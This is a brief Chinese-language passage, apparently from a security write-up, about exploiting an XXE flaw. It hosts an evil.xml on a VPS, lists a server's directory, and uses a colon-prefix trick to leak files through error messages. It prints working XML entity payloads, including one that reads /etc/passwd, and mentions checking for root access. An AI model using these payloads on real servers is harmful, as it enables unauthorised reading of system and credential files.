成功的证明可以连通服务器，然后下面就使用经典的XXE攻击方法，在VPS上放一个evil.xml

<！ENTITY％file SYSTEM“file：///”>
<！ENTITY％ent“<！ENTITY data SYSTEM'％file;'>”>

Awesome！
列出了服务器目录内容。
%file就是模糊匹配。
而且这种不全的协议，也算是一个新的点。

换句话说，可以在第一次出现冒号之前去读取文件:，但不能再读取。绕过此方法然后强制在错误消息中显示完整文件内容的方法是在文件内容之前去添加一个冒号。这将忽略无协议的错误，因为第一个冒号之前的字段将为空，即未定义。

payload像这样：

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % ent "<!ENTITY data SYSTEM ':%file;'>">

为了让漏洞影响更大，看是不是root权限。
